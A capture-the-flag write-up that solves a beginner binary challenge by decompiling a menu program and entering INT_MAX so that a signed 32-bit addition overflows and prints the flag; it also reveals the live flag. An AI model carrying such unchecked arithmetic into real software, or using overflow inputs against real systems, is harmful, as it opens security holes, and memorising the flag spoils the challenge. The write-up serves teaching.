# office-program

[library.m0unt41n.ch/challenges/office-program](https://library.m0unt41n.ch/challenges/office-program) ![](../../resources/pwn.svg) ![](../../resources/baby.svg) 

# TL;DR

We are given an executable which, after decompilation, ends up being a trivial C dialog program,
where we need to overflow a 32-bit counter to get the flag

# Decompilation

```c
__int64 print_flag() {
  char s[1048]; // [rsp+0h] [rbp-420h] BYREF
  FILE *stream; // [rsp+418h] [rbp-8h]

  stream = popen("cat ./flag.txt", "r");
  if ( !stream ) {
    puts("Failed to run command");
    exit(1);
  }
  while ( fgets(s, 1035, stream) )
    printf("%s", s);
  pclose(stream);
  return 0LL;
}

__int64 important_work_or_attend_a_meeting() {
  __int64 result; // rax
  int v1; // [rsp+8h] [rbp-8h]
  int i; // [rsp+Ch] [rbp-4h]

  v1 = rand() % 10;
  printf("\nProcessing");
  for ( i = 0; ; ++i ) {
    result = (unsigned int)i;
    if ( i >= v1 )
      break;
    putchar(46);
    fflush(_bss_start);
    sleep(1u);
  }
  return result;
}

int __fastcall main(int argc, const char **argv, const char **envp) {
  unsigned int v3; // eax
  int v5; // [rsp+Ch] [rbp-4h] BYREF

  setvbuf(_bss_start, 0LL, 2, 0LL);
  v3 = time(0LL);
  srand(v3);
  puts("Welcome to the Office Program");
  while ( 1 ) {
    puts("\nSelect an action:");
    puts("0 - Exit (like leaving the office at 5 PM)");
    puts("1 - Print favourite excel column");
    puts("2 - Call Rebecca from front desk");
    puts("3 - Get secret sauce (only for finance)");
    printf("Enter your choice: ");
    __isoc99_scanf("%d", &v5);
    important_work_or_attend_a_meeting();
    if ( v5 == 3 )
      break;
    if ( v5 < 0 ) {
      puts("\nInput out of range. You confused the system");
      v5 = -v5;
    }
    v5 += 5;
    if ( v5 >= 0 ) {
      v5 = 0;
      puts("\nThe CEO wants to talk to you");
    } else {
      puts("\nInput out of range. You confused the system");
      print_flag();
    }
    if ( rand() % 3 ) {
      if ( rand() % 3 == 1 )
        puts("\nRandom action: Rewinding a cassette tape with a pencil...");
      else
        puts("\nUnexpected error, please insert disk");
    } else {
      puts("\nRandom action: Faxing a memo to nowhere...");
    }
  }
  puts("\nThe Office Program is not able to process the number 3");
  important_work_or_attend_a_meeting();
  puts("\nExiting now...");
  exit(0);
}
```

# Solution

In order to get the flag, we need to ensure that, after `v5 += 5`, the `v5`
is still negative. We need to overflow the 32-bit value, by entering a positive integer
(which would pass the `v5 < 0` check), but large enough that after adding 5, it would become
negative.

`INT_MAX` (`2147483647`) looks about right:

```
$ ./main 
Welcome to the Office Program

Select an action:
0 - Exit (like leaving the office at 5 PM)
1 - Print favourite excel column
2 - Call Rebecca from front desk
3 - Get secret sauce (only for finance)
Enter your choice: 2147483647

Processing.
Input out of range. You confused the system
shc2024{fake_flag}
(...)
```

## The flag

Repeating this in the live environment gets us the flag

---

## `shc2024{monica_please_send_me_the_tax_statement_by_tomorrow}`


<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
